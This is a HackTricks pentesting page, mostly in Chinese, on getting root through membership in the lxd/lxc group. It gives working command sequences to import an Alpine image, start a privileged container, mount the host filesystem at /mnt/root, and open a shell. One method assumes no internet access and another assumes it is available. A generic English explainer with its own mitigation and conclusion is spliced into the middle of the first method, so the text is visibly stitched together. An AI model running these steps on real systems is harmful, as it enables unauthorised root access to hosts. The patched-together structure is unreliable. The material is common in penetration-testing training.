# lxd/lxc组 - 特权升级

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

如果你属于_**lxd**_ **或** _**lxc**_ **组**，你可以成为root用户

## 在没有互联网的情况下进行利用

### 方法1

你可以在你的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)（按照github上的说明进行操作）：
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```
然后，将文件**lxd.tar.xz**和**rootfs.squashfs**上传到受漏洞影响的服务器上。

添加镜像：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# LXD Privilege Escalation

## Introduction

This document explains a privilege escalation technique in LXD, a container hypervisor for Linux systems. By exploiting misconfigurations in LXD, an attacker can gain root access on the host system.

## Prerequisites

To perform this attack, you need the following:

- A Linux system with LXD installed
- Basic knowledge of Linux command-line interface (CLI)

## Attack Steps

1. **Create a container**: First, create a new container using the LXD CLI. Use the following command:

   ```bash
   lxc launch <image> <container-name>
   ```

   Replace `<image>` with the desired container image and `<container-name>` with a name for the container.

2. **Mount the root path**: Once the container is created, mount the root path of the host system inside the container. Use the following command:

   ```bash
   lxc config device add <container-name> host-root disk source=/ path=/mnt/root recursive=true
   ```

   Replace `<container-name>` with the name of the container created in the previous step.

3. **Access the host system**: Start the container and access its shell using the following command:

   ```bash
   lxc exec <container-name> /bin/sh
   ```

4. **Explore the host system**: Now, you have a shell inside the container with access to the host system's root path. You can navigate to `/mnt/root` and explore the host system's files and directories.

## Mitigation

To prevent this privilege escalation attack, follow these recommendations:

- Regularly update LXD to the latest version to ensure any security vulnerabilities are patched.
- Limit the privileges of LXD containers by using appropriate security profiles.
- Avoid running containers with root privileges whenever possible.
- Monitor and review container configurations to identify any misconfigurations that could lead to privilege escalation.

## Conclusion

By understanding and exploiting misconfigurations in LXD, an attacker can escalate their privileges and gain root access on the host system. It is crucial to follow security best practices and regularly update LXD to mitigate such attacks.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
{% hint style="danger" %}
如果你遇到这个错误 _**错误：未找到存储池。请创建一个新的存储池**_\
运行 **`lxd init`** 并 **重复**之前的命令块
{% endhint %}

执行容器：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法2

构建一个Alpine镜像，并使用标志`security.privileged=true`启动它，强制容器以root身份与主机文件系统进行交互。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
另外 [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)

## 有网络连接

您可以按照[这些说明](https://reboare.github.io/lxd/lxd-escape.html)进行操作。
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
## 其他参考资料

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取 PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
